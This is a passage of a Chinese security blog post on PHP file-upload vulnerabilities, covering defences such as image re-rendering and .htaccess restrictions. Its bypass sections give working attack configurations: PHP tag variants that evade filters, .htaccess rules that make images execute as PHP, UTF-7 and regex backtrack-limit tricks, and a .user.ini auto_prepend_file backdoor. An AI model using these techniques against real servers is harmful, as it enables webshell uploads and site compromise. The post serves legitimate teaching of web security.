+<h3 id="绕过-4"><a href="#绕过-4" class="headerlink" title="绕过"></a>绕过</h3><p>这种其实也是相当于黑名单，只要能够找到黑名单中的漏网之鱼即可绕过</p>
+<p>可解析为php的标签</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?</span>=phpinfo(); <span class="meta">?&gt;</span></span><br><span class="line">&lt;script language=php&gt;phpinfo();&lt;/script&gt;    <span class="comment">//php7移除</span></span><br><span class="line"><span class="meta">&lt;?</span> phpinfo(); <span class="meta">?&gt;</span>     <span class="comment">//需要php.ini中short_open_tag=On</span></span><br><span class="line">&lt;% phpinfo(); %&gt;     <span class="comment">//需要php.ini中asp_tags = On  php7移除</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="图片二次渲染"><a href="#图片二次渲染" class="headerlink" title="图片二次渲染"></a>图片二次渲染</h2><p>图片二次渲染，就是根据用户上传的图片，新生成一个图片，将原始图片删除，从而实现上传图片的清洗。<br>相当于是把原本属于图像数据的部分抓了出来，再用自己的API或函数进行重新渲染，在这个过程中非图像数据的部分直接就被隔离开了</p>
+<p>php中通常使用的是GD库中的API函数实现二次渲染。</p>
+<h3 id="校验-3"><a href="#校验-3" class="headerlink" title="校验"></a>校验</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">imagecreatefromjpeg($filename)    <span class="comment">// 由jpg文件或URL创建一个新图像，成功后返回图像资源，失败后返回false</span></span><br><span class="line">imagecreatefrompng($filename)     <span class="comment">// 由png文件或URL创建一个新图像，成功后返回图像资源，失败后返回false</span></span><br><span class="line">imagecreatefromgif($filename)     <span class="comment">// 由gif文件或URL创建一个新图像，成功后返回图像资源，失败后返回false</span></span><br><span class="line"></span><br><span class="line">imagegif($image, $filename)       <span class="comment">// 从image图像以filename为文件名创建一个gif图像</span></span><br><span class="line">imagejpeg($image, $filename)      <span class="comment">// 从image图像以filename为文件名创建一个jpg图像</span></span><br><span class="line">imagepng($image, $filename)       <span class="comment">// 从image图像以filename为文件名创建一个png图像</span></span><br><span class="line"><span class="comment">// 上述的 image 参数是imagecreate() 或 imagecreatefrom* 函数的返回值</span></span><br></pre></td></tr></table></figure>
+
+<p>一个例子：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$imageinfo = getimagesize($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>]);</span><br><span class="line">$upload_dir = <span class="string">"uploads/"</span>;</span><br><span class="line">$postfix_tmp = explode(<span class="string">'.'</span>, $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line">$postfix = end($postfix_tmp);</span><br><span class="line">$filename = md5(time()).<span class="string">".$postfix"</span>;</span><br><span class="line"><span class="keyword">switch</span> ($imageinfo[<span class="string">'mime'</span>]) &#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'image/gif'</span>:</span><br><span class="line">      $image = imagecreatefromgif($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line">      <span class="keyword">if</span>(!$image)</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">"gif has broken"</span>);</span><br><span class="line">      imagegif($image, $upload_dir.$filename);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'image/png'</span>:</span><br><span class="line">      $image = imagecreatefrompng($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line">      <span class="keyword">if</span>(!$image)</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">"png has broken"</span>);</span><br><span class="line">      imagepng($image, $upload_dir.$filename);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'image/jpeg'</span>:</span><br><span class="line">      $image = imagecreatefromjpeg($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line">      <span class="keyword">if</span>(!$image)</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">"jpg has broken"</span>);</span><br><span class="line">      imagejpeg($image, $upload_dir.$filename);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">"error"</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="绕过-5"><a href="#绕过-5" class="headerlink" title="绕过"></a>绕过</h3><p>针对这种二次渲染的绕过，内容很多，这里放几篇文章，看了应该就会了。</p>
+<p><a href="https://xz.aliyun.com/t/2657" target="_blank" rel="noopener">https://xz.aliyun.com/t/2657</a></p>
+<h2 id="限制Web服务器端对于特定类型文件的行为"><a href="#限制Web服务器端对于特定类型文件的行为" class="headerlink" title="限制Web服务器端对于特定类型文件的行为"></a>限制Web服务器端对于特定类型文件的行为</h2><p>导致文件上传漏洞的根本原因在于服务把用户上传的本应是数据的内容当作了代码，一般来说，用户上传的内容都会被存储到特定的一个文件夹下，比如我们很多人习惯于放在<code>./upload/</code>下面要防止数据被当作代码执行，我们可以限制web server对于特定文件夹的行为。</p>
+<p>在Apache中, 我们可以利用<code>.htaccess</code>文件机制来对web server行为进行限制.</p>
+<p>一般来说，配置文件的作用范围都是全局的，但Apache提供了一种很方便的、可作用于当前目录及其子目录的配置文件——<code>.htaccess</code>（分布式配置文件）<br><code>.htaccess</code>是一个纯文本文件，它里面存放着Apache服务器配置相关的指令，它可以配置很多事情，如是否开启站点的图片缓存、自定义错误页面、自定义默认文档、设置WWW域名重定向、设置网页重定向、设置图片防盗链和访问权限控制等等。参考：<a href="https://www.centos.bz/2017/11/apache-htaccess文件详解和配置技巧总结/" target="_blank" rel="noopener">https://www.centos.bz/2017/11/apache-htaccess文件详解和配置技巧总结/</a></p>
+<p>但我们这里只关心<code>.htaccess</code>文件的一个作用——<code>MIME类型修改</code>。</p>
+<p>首先，要想使<code>.htaccess</code>文件生效，需要两个条件:</p>
+<ol>
+<li>在Apache的配置文件中写上：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AllowOverride All</span><br></pre></td></tr></table></figure>
+若这样写则.htaccess不会生效：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AllowOverride None</span><br></pre></td></tr></table></figure></li>
+<li>Apache要加载mod_Rewrite模块。加载该模块，需要在Apache的配置文件中写上：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LoadModule rewrite_module /usr/lib/apache2/modules/mod_rewrite.so</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p>若是在Ubuntu中，可能还需要执行命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo a2enmod rewrite</span><br></pre></td></tr></table></figure>
+<p>配置完后需要重启Apache。</p>
+<p>禁止脚本执行有多种方式可以实现，而且分别有不同的效果</p>
+<ol>
+<li>指定特定扩展名的文件的处理方式,原理是指定Response的<code>Content-Type</code>可以加上如下几行<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType <span class="built_in">text</span>/plain .pl .py .php</span><br></pre></td></tr></table></figure>
+这种情况下，以上几种脚本文件会被当作纯文本来显示出来，你也可以换成其他的<code>Content-Type</code></li>
+<li>如果要完全禁止特定扩展名的文件被访问，用下面的几行<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Options -ExecCGI</span><br><span class="line">AddHandler cgi-script .php .pl .py .jsp .asp .htm .shtml .sh .cgi</span><br></pre></td></tr></table></figure>
+在这种情况下，以上几种类型的文件被访问的时候，会返回<code>403 Forbidden</code>的错误</li>
+<li>也可以强制web服务器对于特定文件类型的处理，与第一条不同的是，下面的方法直接强行让apache将文件识别为你指定的类型，而第一种是让浏览器将该文件识别为指定类型<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">"\.(php|pl|py|jsp|asp|htm|shtml|sh|cgi)$"</span>&gt;</span><br><span class="line">ForceType <span class="built_in">text</span>/plain</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+符合上面正则的全部被认为是纯文本，也可以继续往里面加入其他类型</li>
+<li>只允许访问特定类型的文件<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files ^(*.jpeg|*.jpg|*.png|*.gif)&gt;</span><br><span class="line">order deny,allow</span><br><span class="line">deny from all</span><br><span class="line">&lt;/Files&gt;</span><br></pre></td></tr></table></figure>
+在一个上传图片的文件夹下面，就可以加上这段代码，使得该文件夹里面只有图片扩展名的文件才可以被访问，其他类型都是拒绝访问。<br>这又是一个白名单的处理方案</li>
+</ol>
+<h3 id="绕过-6"><a href="#绕过-6" class="headerlink" title="绕过"></a>绕过</h3><p>如果服务端没有将上传的文件进行重名命，那么就可以上传一个我们精心构造的<code>.htaccess</code>文件去覆盖掉现有文件，如果我们可以控制了<code>.htaccess</code>文件，那么一切都好办了。</p>
+<p>利用姿势：</p>
+<ol>
+<li><p>使用<code>FilesMatch</code></p>
+ <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">"abc"</span>&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"></span><br><span class="line"># 文件名中包含有abc字符的都将作为php脚本执行</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用<code>AddType</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br><span class="line"></span><br><span class="line">#文件后缀为.jpg的都将作为php脚本执行</span><br></pre></td></tr></table></figure></li>
+<li><p>使用<code>php_value</code>设置php配置</p>
+<ul>
+<li><p>自动包含文件<br>   <strong>用途：文件包含，可以配合AddType来绕过限制上传木马</strong></p>
+   <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_file xxx.php  </span><br><span class="line">php_value auto_append_file <span class="string">"php://filter/convert.base64-decode/resource=shell.xxx"</span>     </span><br><span class="line">#使作用范围内的php文件在文件头自动include指定文件，支持php伪协议</span><br><span class="line"></span><br><span class="line">php_value include_path <span class="string">"xxx"</span>   </span><br><span class="line">#如果当前目录无法写文件，也可以改变包含文件的路径，去包含别的路径的文件</span><br></pre></td></tr></table></figure>
+
+   <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_file <span class="string">".htaccess"</span></span><br><span class="line"># &lt;?<span class="function">php <span class="title">phpinfo</span><span class="params">()</span></span>;?&gt;</span><br><span class="line"># 包含自身</span><br></pre></td></tr></table></figure></li>
+<li><p>利用报错信息写文件</p>
+   <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php_value error_reporting <span class="number">32767</span> </span><br><span class="line">php_value error_log /tmp/error_shell.php</span><br><span class="line"></span><br><span class="line"># 开启报错的同时将报错信息写入文件</span><br><span class="line"></span><br><span class="line">php_value display_errors <span class="number">1</span>      #显示错误信息</span><br></pre></td></tr></table></figure></li>
+<li><p>编码绕过尖括号过滤</p>
+   <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php_value zend.multibyte <span class="number">1</span></span><br><span class="line">php_value zend.script_encoding <span class="string">"UTF-7"</span></span><br><span class="line"></span><br><span class="line">#将代码的解析方式改成UTF<span class="number">-7</span></span><br><span class="line">#此时我们上传utf<span class="number">-7</span>编码的php脚本，这样就没有了php特征，可以绕过检查</span><br></pre></td></tr></table></figure></li>
+<li><p>Prce绕过正则匹配</p>
+   <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value pcre.backtrack_limit <span class="number">0</span></span><br><span class="line">php_value pcre.jit <span class="number">0</span></span><br></pre></td></tr></table></figure>
+<p>   如果正则类似<code>if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) == 1)</code> 而不是<code>if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) !== 0)</code>，可以通过<code>php_value</code>设置正则回朔次数来使正则匹配的结果返回为false而不是0或1，默认的回朔次数比较大，可以设成0，那么当超过此次数以后将返回false</p>
+</li>
+</ul>
+</li>
+<li><p>其他</p>
+<ul>
+<li>.htaccess可以使用<code>\</code>将两行内容解释为一行</li>
+<li>绕过exif_imagetype()上传.htaccess（在文件开头加上标识图片的宽和高）   <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> width 20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> height 10</span></span><br><span class="line">#这里写我们的规则</span><br><span class="line">xxx xxx</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+</li>
+</ol>
+<h2 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h2><p>类似于<code>.htaccess</code>的文件，<code>.user.ini</code>是一个能被动态加载的ini文件。也就是说我修改了<code>.user.ini</code>后，不需要重启服务器中间件，只需要等待php.ini中<code>user_ini.cache_ttl</code>所设置的时间（默认为300秒），即可被重新加载</p>
+<p>简单的说，<code>.user.ini</code>是php版本的<code>.htaccess</code>，它可以设置所有<code>ini_set()</code>可以设置的配置项。</p>
+<p>要使.user.ini生效，需要修改php.ini 中的这两个参数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user_ini.filename = <span class="string">".user.ini"</span></span><br><span class="line">user_ini.cache_ttl = <span class="number">300</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>利用.user.ini来构造后门</strong><br>条件：</p>
+<ol>
+<li>含有<code>.user.ini</code>的文件夹下需要有正常的php文件</li>
+<li>以fastcgi运行的php</li>
+<li>php&gt;5.3.0</li>
+</ol>
+<p>php.ini中有两个配置项：<code>auto_prepend_file</code>和<code>auto_append_file</code>。该配置项会让php文件<strong>在执行时包含一个指定的文件</strong></p>
+<ul>
+<li><code>auto_prepend_file</code>在页面顶部加载文件</li>
+<li><code>auto_append_file</code>在页面底部加载文件</li>
+</ul>
+<p>他们是通过<code>require</code>来自动调用文件的通过这个配置项</p>
+<p>所以利用方法很简单，<code>.user.ini</code>文件内容</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=a.jpg</span><br></pre></td></tr></table></figure>
+<p>其会在每个这个目录下所有的php文件执行前require一次a.jpg</p>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Dar1in9</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://dar1in9s.github.io/2020/04/09/file-upload/">http://dar1in9s.github.io/2020/04/09/file-upload/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://Dar1in9s.github.io">Dar1in9's Blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a><a class="post-meta__tags" href="/tags/php/">php</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2020/04/10/php%E4%B9%8B%E4%B8%AD%E7%9A%84tricks/"><i class="fa fa-chevron-left">  </i><span>PHP中的一些tricks</span></a></div><div class="next-post pull-right"><a href="/2020/04/03/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/"><span>php弱类型以及一些函数的特点</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://blog-1300147235.cos.ap-chengdu.myqcloud.com/18085.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2020 By Dar1in9</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.7.0"></script><script src="/js/fancybox.js?version=1.7.0"></script><script src="/js/sidebar.js?version=1.7.0"></script><script src="/js/copy.js?version=1.7.0"></script><script src="/js/fireworks.js?version=1.7.0"></script><script src="/js/transition.js?version=1.7.0"></script><script src="/js/scroll.js?version=1.7.0"></script><script src="/js/head.js?version=1.7.0"></script><script src="/js/search/algolia.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.css"><script src="/js/katex.js"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+  $('#top-container').addClass('is-mobile')
+}</script><div class="search-dialog" id="algolia-search"><div class="search-dialog__title" id="algolia-search-title">Algolia</div><div id="algolia-input-panel"><div id="algolia-search-input"></div></div><hr><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-stats"></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>
